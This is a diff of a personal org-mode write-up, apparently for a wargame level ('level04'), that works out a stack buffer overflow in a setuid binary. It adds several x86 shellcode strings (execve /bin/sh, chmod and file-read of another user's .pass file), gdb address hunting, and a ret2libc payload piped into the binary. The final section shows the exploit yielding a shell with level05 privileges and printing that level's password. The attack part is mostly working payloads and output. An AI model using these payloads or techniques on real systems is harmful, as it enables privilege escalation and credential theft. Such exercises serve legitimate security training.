@@ -309,8 +309,8 @@ prctl(1,1);
     $3 = 0xdc
     set follow-fork-mode child
     b gets
-  $5 = 156
   p/d $ebp+4 - $eax
+  $5 = 156
     #+end_src
 ** Get the buffer va
     ltrace
@@ -338,18 +338,15 @@ prctl(1,1);
     [pid 1717] +++ exited (status 0) +++
     #  We take the -9280 and convert to a x32 pointer
          gdb ./$USER --batch -ex "p/x (unsigned int)-9280" -ex "p/u (unsigned int)-9280"
-      $1 = 0xffffdbc0
-      $2 = 4294958016
-
+      buffer va = 0xffffdbc0
 #+end_src
 ** Explotation idea
 #+begin_src shell
 may i need to fork to and in the fork execute the shellcode?
 #+end_src
-
 *** Get shellcode
 #+begin_src asm
-  ;      In case need the parent a life
+  ;      In case need the child a life
           0:  31 c0;                   xor    eax,eax
           2:  b0 02                   mov    al,0x2
           4:  cd 80                   int    0x80;fork
@@ -417,11 +414,171 @@ may i need to fork to and in the fork execute the shellcode?
   mov    al, 0xb
   xor eax, eax # ptr to null
   mov [eax], al; # null[0] = '\0' -> segfault
-
   	shellcode size = 23 = 32 + 3 = 35 B.
 "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\x31\xC0\x88\x00"
 #+end_src
+*** Join all together
+#+begin_src shell
+    offset = 156
+    buffer va = 0xffffdbc0
+    shell code forked child wait = "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x93\x31\xC0\xB0\x07\x31\xC9\x31\xD2\xCD\x80\x31\xC0\xB0\x01\xCD\x80" size 50 B.
+            shellcode exit "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x31\xC0\xB0\x01\xCD\x80" size 37 B.
+            shellcode segfault "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\x31\xC0\x88\x00" size 35 B.
+            Doesn't work
+  (python -c 'print "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x31\xC0\xB0\x01\xCD\x80" + "A"*116 + "\xff\xff\xdb\xc0"[::-1]'; cat -) | ./$USER
+  #+end_src
+      a nicer solution is use a shellcode to open,read,write or chmod the .pass.
+****  Chmod test.
+#+begin_src shell
+        chmod approach
+      0x804b068:	0x6d6f682f	0x73752f65	0x2f737265	0x6576656c
+        x/7x "/home/users/level05/.pass"
+      0x804b078:	0x2f35306c	0x7361702e	0x00000073
+      don't like null we need to add '///'
+    (gdb) x/7x "////home/users/level05/.pass"
+    0x804b058:	0x2f2f2f2f	0x656d6f68	0x6573752f	0x6c2f7372
+    0x804b068:	0x6c657665	0x2e2f3530	0x73736170
+
+    0:  31 c0                   xor    eax,eax
+    2:  50                      push   eax
+    3:  68 70 61 73 73          push   0x73736170
+    8:  68 30 35 2f 2e          push   0x2e2f3530
+    d:  68 65 76 65 6c          push   0x6c657665
+    12: 68 72 73 2f 6c          push   0x6c2f7372
+    17: 68 2f 75 73 65          push   0x6573752f
+    1c: 68 68 6f 6d 65          push   0x656d6f68
+    21: 68 2f 2f 2f 2f          push   0x2f2f2f2f
+    26: 89 e5                   mov    ebp,esp
+    28: 68 ff 01 00 00          push   0x1ff
+    2d: 59                      pop    ecx
+    2e: b0 0f                   mov    al,0xf
+    30: cd 80                   int    0x80
+    shellcode "\x31\xC0\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2F\x2E\x68\x65\x76\x65\x6C\x68\x72\x73\x2F\x6C\x68\x2F\x75\x73\x65\x68\x68\x6F\x6D\x65\x68\x2F\x2F\x2F\x2F\x89\xE5\x68\xFF\x01\x00\x00\x59\xB0\x0F\xCD\x80"
+    0x32 = 48+2=50 B
+    buffer va = 0xffffdbc0
+    offset = 156
+    recover esp pointer at  144 + 0xffffdbc0 value should be correct.
+    144 - 50 = 94
+    buffer va + 144 =
+    0x28 al.
+    if not unespected behaviour
+    The stack is in theory executable but appear like no
+    x/s $eax
+  0xffffdba0:	 "1\300Phpassh05/.hevelhrs/lh/usehhomeh////\211\345h\377\001Y\260\017̀", 'A' <repeats 94 times>, "0\334\377\377AAAAAAAAAA\240\333\377\377"
+  (gdb) c
+  Continuing.
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0xffffdca0 in ?? ()
+  2: /a $esp = 0xffffdc18
+  1: x/i $eip
+  => 0xffffdca0:	add    %eax,(%eax)
+  (gdb) shell readelf -Wl ./level04
+
+  Elf file type is EXEC (Executable file)
+  Entry point 0x8048580
+  There are 9 program headers, starting at offset 52
+
+  Program Headers:
+    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+    PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
+    INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
+        [Requesting program interpreter: /lib/ld-linux.so.2]
+    LOAD           0x000000 0x08048000 0x08048000 0x00ae8 0x00ae8 R E 0x1000
+    LOAD           0x000f00 0x08049f00 0x08049f00 0x00140 0x0014c RW  0x1000
+    DYNAMIC        0x000f18 0x08049f18 0x08049f18 0x000d8 0x000d8 RW  0x4
+    NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
+    GNU_EH_FRAME   0x000944 0x08048944 0x08048944 0x00054 0x00054 R   0x4
+    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+  should be able to use stack but its kind of trycky i am going to use a env var.
+  I tested in my machine and doesn't work.
+    #+end_src
+**** Cat of the file.
+#+begin_src shell
+           push   0x73736170
+           push   0x2e2f3530
+           push   0x6c657665
+           push   0x6c2f7372
+           push   0x6573752f
+           push   0x656d6f68
+           push   0x2f2f2f2f
+           mov    ebx,esp
+           xor    ecx,ecx
+           xor    edx,edx
+           push   0x5
+           pop    eax
+           int    0x80
+           mov    ebx,eax
+           push   0x3
+           pop    eax
+           mov    dl,0x40
+           sub    esp,edx
+           mov    ecx,esp
+           int    0x80
+           mov    al,0x4
+           mov    ebx,esp
+           mov    ecx,edx
+           int    0x80
+
+          shellcode. "\x68\x70\x61\x73\x73\x68\x30\x35\x2F\x2E\x68\x65\x76\x65\x6C\x68\x72\x73\x2F\x6C\x68\x2F\x75\x73\x65\x68\x68\x6F\x6D\x65\x68\x2F\x2F\x2F\x2F\x89\xE3\x31\xC9\x31\xD2\x6A\x05\x58\xCD\x80\x89\xC3\x6A\x03\x58\xB2\x40\x29\xD4\x89\xE1\xCD\x80\xB0\x04\x89\xE3\x89\xD1\xCD\x80\x89\xE3\x89\xD1\xCD\x80"
+
+          buffer_va=0xffffdbc0
+        echo "obase=16; $((0xffffdbc0)) + 144" | bc
+          offset_esp_recover=0xffffdc50
+            offset = 156
+    cat <<eof >/tmp/getenv.c
+    >
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    int main(int argc, char *argv[]) {
+        printf("%p\n", getenv("SHELLCODE"));
+    }
+    > > > > > > > > eof
+  gcc -m32 -o /tmp/getenv /tmp/getenv.c
+      /tmp/getenv
+          env_va= 0xffffdd82
+     env_va + 10= 0xffffdd8c
+
+            recover esp pointer at  144 + 0xffffdbc0 value should be correct.
+            144 - 50 = 94
+#+end_src
+**** Let's try system
+#+begin_src shell
+            b main
+            r
+           p &system
+          $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+        info proc map
+        process 1844
+        Mapped address spaces:
+
+        	Start Addr   End Addr       Size     Offset objfile
+        	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+        	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+        	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+
+
+  $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+     find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+    0xf7f897ec /bin/sh
+  "aaaa"
+
+  "BBBB" = return va of system.
+      (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "aaaa" + "\xec\x97\xf8\xf7"'; cat -) | ./level04
+
+#+end_src
+
 * Explotation
 #+begin_src shell
-cat /tmp/$USER - | ./$USER
+      (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"'; cat -) | ./level04
+  a
+  /bin/sh: 1: a: not found
+  id
+  uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
+  whoami
+  level05
+  cat /home/users/level05/.pass
+  3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 #+end_src
